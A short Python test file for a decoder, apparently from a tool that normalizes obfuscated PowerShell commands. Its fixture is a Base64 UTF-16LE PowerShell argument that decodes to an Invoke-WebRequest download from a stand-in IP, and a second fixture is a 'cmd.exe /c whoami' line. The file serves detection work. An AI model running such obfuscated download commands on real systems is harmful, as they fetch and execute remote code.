from src.normalizer.decoder import decode_powershell_base64


def test_powershell_utf16le_sample_decoding():
    cmd = "powershell.exe -nope aQB3AHIAIAAxADkAOAAuADUAMQAuADEAMAAwAC4ANAAyAC8AdQA="

    decoded, obf_type = decode_powershell_base64(cmd)

    assert "iwr 198.51.100.42/u" in decoded
    assert obf_type == "Base64 (UTF-16LE)"


def test_unencoded_command_passthrough():
    cmd = "cmd.exe /c whoami"
    decoded, obf_type = decode_powershell_base64(cmd)
    assert decoded == cmd
    assert obf_type == "None"
